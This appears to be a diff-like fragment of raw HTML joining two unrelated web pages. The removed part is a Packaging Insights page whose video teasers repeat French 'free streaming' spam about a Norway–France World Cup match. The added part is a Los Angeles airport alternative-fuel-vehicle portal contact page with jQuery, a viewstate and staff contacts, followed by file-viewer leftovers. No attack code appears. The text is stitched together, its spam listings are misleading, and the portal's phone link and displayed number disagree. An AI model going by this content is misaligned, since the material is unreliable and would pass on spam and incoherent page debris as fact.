-  <div class="tagbottom source-backgroundcolor responsepaddingtop">Video<span class="playbutton"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-209c31.4-18.5 31.5-64.1 0-82.6z"></path></svg></span>12:18</div></div>
-  <div class="morecontenttitlesdiv linkcursor responsealigncontent"><p class="morevideotitle responsemargintop"> <!-- -->Norvège - France today</p>
-  <p class="morevideocontent responsedisplaynone">EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I</p></div></a></div>
-  <div class="morecontentdiv">
-  <a href="https://www.packaginginsights.com/video/totalenergies-corbion-bioplastics-inc5.html" class="multimediaredirect source-color">
-  <div class="moreimagediv linkcursor responseheightfitcontent">
-  <div class="hover-bg" style="background-image:url(&quot;https://resource-innova.s3.amazonaws.com/media/5ACX4YBGPZWNKND5647TGUDQNU/GIF/5ACX4YBGPZWNKND5647TGUDQNU.gif&quot;)"></div>
-  <img class="rec-size" src="http://ac.ipvc.pt/imgs/1/featuredImage.jpg" alt="FormattedPicture" style="width:100%;height:100%"/>
-  <div class="tagbottom source-backgroundcolor responsepaddingtop">Video<span class="playbutton"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-209c31.4-18.5 31.5-64.1 0-82.6z"></path></svg></span>17:17</div></div>
-  <div class="morecontenttitlesdiv linkcursor responsealigncontent"><p class="morevideotitle responsemargintop"> <!-- -->Norvège - France today </p><p class="morevideocontent responsedisplaynone">EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I</p></div></a></div></div>
-  <div style="width:100%"></div></div>
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"VideoObject","name":"[Streaming-Gratuit] Norvège - France Coupe du Monde de la FIFA match en direct Live 2026","description":"EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I ","thumbnailUrl":"http://ac.ipvc.pt/imgs/1/hq72021.jpg","uploadDate":"2026-06-26T00:00:00"}</script></div></div>
-  <div id="footer" class="footer-content">
-  <div class="footerheadtitle source-backgroundcolor">
-  <div class="centerfooter">
-  <div class="formfooter">
-  <div class="subscribetext">Subscribe to our newsletters</div>
-  <div class="emailaddress">
-  <input type="text" id="newsemail" placeholder="Enter email address here"/></div>
-  <div class="subscribebutton">
-    <button id="subscribe" class="footerhead">Subscribe <div class="subscribearr"><svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" class="subscribearrow" height="20px" width="20px" xmlns="http://www.w3.org/2000/svg"><path d="M15.0478 6.34317L13.6269 7.76069L17.8972 11.0157L3.29211 11.0293L3.29413 13.0293L17.8619 13.0157L13.6467 17.2459L15.0643 17.6568L20.7079 11.9868L15.0478 6.34317Z" fill="currentColor"></path></svg></div></button></div></div>
-  <div style="width:100%;height:35px"></div>
-  <div class="fl">
-  <div class="footerlinksdiv"></div>
-  <div class="platforms">
-  <span class="footersubtitle footerhead footerelements">Platforms</span><span class="footersubtitle footerelements"></span></div>
-  <div class="aboutus">
-  <span class="footersubtitle footerhead footerelements">
-  <a style="display:inline-block" href="/aboutus.html" class="aboutlink">About us</a></span>
-  <span class="footersubtitle  footerelements"><a href="/contactus.html">Contact us</a></span>
-  <span class="footersubtitle footerelements"><a href="mailto:sales@cnsmedia.com?subject=Advertising Enquiry Packaging Insights" target="_blank">Advertising</a></span>
-  <span class="footersubtitle footerelements"><a href="/privacy-statement.html" target="_blank">Privacy statement</a></span>
-  <span class="footersubtitle footerelements"><a href="/sitemap.html">Sitemap</a></span>
-  <span class="footersubtitle footerelements">
-  <a href="/archive.html">Archive</a></span></div></div></div></div></div>
-  <div id="sitecontainer" style="display:none;background-color:rgb(102, 102, 102);bottom:0">
-  <div id="CookiePolicy_div" class="CookiePolicy_div" style="background-color:#666666">
-  <div class="CookiePolicy_subdiv"><div class="CookiePolicy_text">By continuing to browse our site you agree to our<!-- --> <a href="https://www.packaginginsights.com/privacy-statement.html" class="CookiePolicy_text CookiePolicy_a" target="_blank" rel="noopener" style="text-decoration:none;border-bottom:2px solid #B3B3B3;color:white;cursor:pointer;padding-top:2px">Privacy Statement</a></div>
-  <div style="margin-top:1%" class="CookiePolicy_button source-color"><button class="newsubbtn" style="padding-left:10px;position:relative;top:-6.5px"><span style="margin-right:6px"> I </span><span> Agree </span>
-  <div class="subarr"><svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" class="subscribearrow" height="20px" width="20px" xmlns="http://www.w3.org/2000/svg"><path d="M15.0478 6.34317L13.6269 7.76069L17.8972 11.0157L3.29211 11.0293L3.29413 13.0293L17.8619 13.0157L13.6467 17.2459L15.0643 17.6568L20.7079 11.9868L15.0478 6.34317Z" fill="currentColor"></path></svg></div></button></div></div></div></div>
-  <div class="containers">
-  <div class="bellicon">
-  <a href="/subscribe.html" aria-label="Sign up to our newsletters">
-  <div class="icon-container"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="white" style="color:white" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M10 5a2 2 0 1 1 4 0a7 7 0 0 1 4 6v3a4 4 0 0 0 2 3h-17a4 4 0 0 0 2 -3v-3a7 7 0 0 1 4 -6"></path><path d="M9 17v1a3 3 0 0 0 6 0v-1"></path></svg></div></a></div></div>
-  <div><a href="#top" class="top_link "><img src="https://assets.innovamarketinsights360.com/insights/Common/Images/trans.gif" alt="trans" loading="eager" fetchPriority="high"/></a></div></div>
-  <script src="/_next/static/chunks/webpack-5d8e581bd320042f.js" async=""></script>
-	        </body></html>
+
+        //$(window).load(function () {
+        //    // When the page has loaded
+        //    $("body").fadeIn(888);
+        //});
+
+        $(document).ready(function () {
+
+            $(".tooltipelem").tooltip();
+
+            var hashid = window.location.hash;
+            var hashidAsString = String(hashid);
+
+            if (hashidAsString.indexOf("anchorid") !== -1) {
+
+                //$('html, body').animate({scrollTop: $(hashid).offset().top}, 500);
+
+                $(hashid).parent().parent().css("background", "#FFF29D").delay(5000).queue(function () {
+                    $(this).css("background", "").dequeue();
+                });
+            }
+
+            var intervalID;
+            intervalID = setInterval(function () {
+                $(".msgBox").text("");
+                clearInterval(intervalID);
+            }, 30000); // hide message after 30 seconds
+
+        });
+
+    </script>
+
+    
+</head>
+<body style="padding-top: 20px; padding-left: 15px; padding-right: 15px;">       
+    <span id="spanDebug"></span>
+
+    <div id="divHeader">
+        <!-- Main navigation bar -->
+        <nav class="navbar navbar-default navbar-fixed-top" role="navigation">		 
+            <div class="container-fluid">
+                <!-- Brand and toggle get grouped for better mobile display -->
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>                    
+                    <img src="Content/LAWA-LAX-logo.png" class="img-responsive logo-responsive"/>
+                    <div class="homepage-msg navbar-homepagemsg-center">
+				        <a title="Home page" href="login" class="navbar-brand visible-xs">
+        			        The LAX ALTERNATIVE FUEL VEHICLE ONLINE REPORTING PORTAL
+                            <!-- <span class="master-plan-space">LAX Master Plan Program</span>-->
+					    </a>
+                    </div>                    
+                </div>
+
+                <!-- Collect the nav links, forms, and other content for toggling -->
+                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">                   
+                        
+                        <ul class="nav navbar-nav navbar-homepagemsg-center">                                             
+                            <li>
+                                <div class="homepage-msg">
+                                    <a title="Home page" href="login" class="navbar-brand hidden-xs">
+						                <span id="lblHOMEPAGE_MSG">The LAX ALTERNATIVE FUEL VEHICLE ONLINE REPORTING PORTAL</span>     
+                                        <!--<span class="master-plan-space">LAX Master Plan Program</span>  -->                                   
+					                </a>                               
+                                </div>
+                            </li>                       
+                        </ul>                        
+                    
+                    
+                        <ul class="nav navbar-nav navbar-right navbar-menu-right">                        
+                            
+                            <li></li>
+                            <li></li>                                                   
+                        </ul>
+                    
+                    
+                </div><!-- /.navbar-collapse -->
+            </div><!-- /.container-fluid -->
+        </nav>
+    </div>
+    
+    <form method="post" action="./contactus" id="form1" style="padding-top: 110px;">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTY1NDU2MTA1Mg9kFgJmDw8WBB4TX19BbnRpWHNyZlRva2VuTEFXQQUgOWMyOGZmNzVmNzM0NDM4OGJkNWQxZDhlYTQyNzYxMWQeFl9fQW50aVhzcmZVc2VyTmFtZUxBV0FlZBYCAgIPZBYGZg8PFgIeBFRleHQFOFRoZSBMQVggQUxURVJOQVRJVkUgRlVFTCBWRUhJQ0xFIE9OTElORSBSRVBPUlRJTkcgUE9SVEFMZGQCAg8WAh4HVmlzaWJsZWhkAgMPFgIfA2hkZJwL5BFQDz+ax1dNOggV+m1zqS0VL4jSmp7Ct0vMr4ZW" />
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="54C47DD8" />
+</div>
+        
+
+    <div style="text-align: center">
+        <h4>LAX Alternative Fuel Vehicle General Inbox: <a href="altfuel@lawa.org" title="Email Altfuel">altfuel@lawa.org</a></h4>
+        <p>
+            LAWA Administrator: Amylou Canonizado
+        </p>
+        <p>
+            <a title="Email Amylou Canonizado" href="mailto:acanonizado@lawa.org" target="_top">acanonizado@lawa.org</a>
+        </p>
+        <p style="padding-top: 15px;">
+            Phone: <a href="tel:4243567650">(424)356-7950</a>
+        </p>      
+    </div>
+
+
+    </form>
+
+    <p style="padding-top: 100px; padding-bottom: 25px; text-align: center; font-size: x-small" id="copyright">
+        © 2026 Los Angeles World Airports. All rights reserved.
+        <br />
+        Best viewed on Internet Explorer 10+, Edge, Chrome, Firefox, or Safari on Windows or macOS
+    </p>
+</body>
+</html>
+apps-fileview.texmex_20260101.00_p1
+htjnm.html
+Displaying htjnm.html.
